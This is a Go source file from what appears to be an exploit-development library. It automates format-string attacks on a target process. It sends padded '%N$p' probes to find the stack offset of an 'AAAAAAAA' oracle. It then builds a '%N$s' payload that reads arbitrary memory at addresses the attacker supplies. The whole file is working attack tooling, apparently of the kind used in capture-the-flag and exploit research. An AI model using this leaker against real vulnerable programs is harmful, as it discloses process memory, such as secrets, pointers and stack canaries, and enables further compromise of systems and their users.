package process

import (
	"bytes"
	"fmt"
	"log"
	"strconv"
	"strings"
)

type FormatStringDirectParamConfig struct {
	GetProcessFn func() *Process
	MaxNumParams int
	PointerSize  int
	Verbose      *log.Logger
}

func (o FormatStringDirectParamConfig) validate() error {
	if o.GetProcessFn == nil {
		return fmt.Errorf("get process function cannot be nil")
	}

	if o.MaxNumParams <= 0 {
		return fmt.Errorf("maximum number of format function parameters must be greater than 0")
	}

	if o.PointerSize <= 0 {
		return fmt.Errorf("pointer size in bytes must be greater than 0")
	}

	return nil
}

func LeakUsingFormatStringDirectParamOrExit(config FormatStringDirectParamConfig) *FormatStringMemoryLeaker {
	f, err := LeakUsingFormatStringDirectParam(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create format string param memory leaker - %w", err))
	}
	return f
}

type directParamAccessFormatString struct {
	info        formatStringInfo
	paramNumber int
}

type formatStringInfo struct {
	leakedDataSep    []byte
	specifierChar    byte
	endOfStringDelim []byte
}

func (o directParamAccessFormatString) paddedTo(finalStrLen int) []byte {
	return prependStringWithCharUntilLen(o.withoutPadding(), 'A', finalStrLen)
}

func (o directParamAccessFormatString) withoutPadding() []byte {
	buff := bytes.NewBuffer(nil)
	buff.Write(o.info.leakedDataSep)
	buff.WriteString("%")
	buff.WriteString(strconv.Itoa(o.paramNumber))
	buff.WriteString("$")
	buff.WriteByte(o.info.specifierChar)
	buff.Write(o.info.leakedDataSep)
	buff.Write(o.info.endOfStringDelim)
	return buff.Bytes()
}

func LeakUsingFormatStringDirectParam(config FormatStringDirectParamConfig) (*FormatStringMemoryLeaker, error) {
	err := config.validate()
	if err != nil {
		return nil, err
	}

	formatStringConfig := directParamAccessFormatString{
		paramNumber: 0,
		info:        formatStringInfo{
			leakedDataSep:    []byte("|"),
			specifierChar:    'p',
			endOfStringDelim: []byte("foozlefu"),
		},
	}

	// The resulting string is going to look like this:
	//     [padding][format-string-with-loop-index][address]
	//
	// The "padding" is required because of the format
	// string parameter specifier. As it grows, it could
	// potentially mess up the alignment of the stack,
	// which will make finding the oracle very difficult.
	//
	// Set to max for str len calculation.
	formatStringConfig.paramNumber = config.MaxNumParams
	fmtStringLen := formatStringStackAlignedLen(
		formatStringConfig.withoutPadding(),
		config.PointerSize)

	if config.Verbose != nil {
		config.Verbose.Printf("format string config: %+v\nlen: %d\nstring w/o padding: '%s'",
			formatStringConfig, fmtStringLen, formatStringConfig.withoutPadding())
	}

	oracle := strings.Repeat("A", 8)
	// TODO: Some platforms do not include '0x' in the format
	//  function's output.
	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))

	i := 0
	for ; i < config.MaxNumParams; i++ {
		formatStringConfig.paramNumber = i

		str := append(formatStringConfig.paddedTo(fmtStringLen), oracle...)
		if config.Verbose != nil {
			config.Verbose.Printf("iteration %d writing: '%s'...", i, str)
		}

		addressFromFormatFunc, err := leakDataWithFormatString(
			config.GetProcessFn(),
			str,
			formatStringConfig.info)
		if err != nil {
			return nil, err
		}

		if config.Verbose != nil {
			config.Verbose.Printf("read: '%s'", addressFromFormatFunc)
		}

		if bytes.Equal(addressFromFormatFunc, formattedOracle) {
			formatStringConfig.info.specifierChar = 's'
			finalPaddedFormatStr := formatStringConfig.paddedTo(fmtStringLen)

			if len(finalPaddedFormatStr) != fmtStringLen {
				return nil, fmt.Errorf("final format string length should be %d bytes, it is %d bytes",
					fmtStringLen, len(finalPaddedFormatStr))
			}

			return &FormatStringMemoryLeaker{
				formatStr: finalPaddedFormatStr,
				info:      formatStringConfig.info,
			}, nil
		}
	}

	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
}

type FormatStringMemoryLeaker struct {
	formatStr []byte
	info      formatStringInfo
}

func (o FormatStringMemoryLeaker) MemoryAtOrExit(pointer Pointer, process *Process) []byte {
	p, err := o.MemoryAt(pointer, process)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer, err))
	}
	return p
}

func (o FormatStringMemoryLeaker) MemoryAt(pointer Pointer, process *Process) ([]byte, error) {
	return leakDataWithFormatString(process, append(o.formatStr, pointer...), o.info)
}

func leakDataWithFormatString(process *Process, formatStr []byte, info formatStringInfo) ([]byte, error) {
	err := process.WriteLine(formatStr)
	if err != nil {
		return nil, fmt.Errorf("failed to write format string to process - %w", err)
	}

	token, err := process.ReadUntil(info.endOfStringDelim)
	if err != nil {
		return nil, fmt.Errorf("failed to format string end of string delim from process - %w", err)
	}

	firstSepIndex := bytes.Index(token, info.leakedDataSep)
	if firstSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain first foramt string separator")
	}

	lineWithoutFirstSep := token[firstSepIndex+1:]
	lastSepIndex := bytes.Index(lineWithoutFirstSep, info.leakedDataSep)
	if lastSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain second foramt string separator")
	}

	return lineWithoutFirstSep[0:lastSepIndex], nil
}

func formatStringStackAlignedLen(finalFormatString []byte, pointerSizeBytes int) int {
	maxFormatStringLen := len(finalFormatString)
	paddLen := 0
	for {
		if (maxFormatStringLen + paddLen) % pointerSizeBytes == 0 {
			break
		}
		paddLen++
	}
	return paddLen + maxFormatStringLen
}

func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
	strLen := len(str)
	if strLen >= newLen {
		return str
	}

	return append(bytes.Repeat([]byte{c}, newLen-strLen), str...)
}
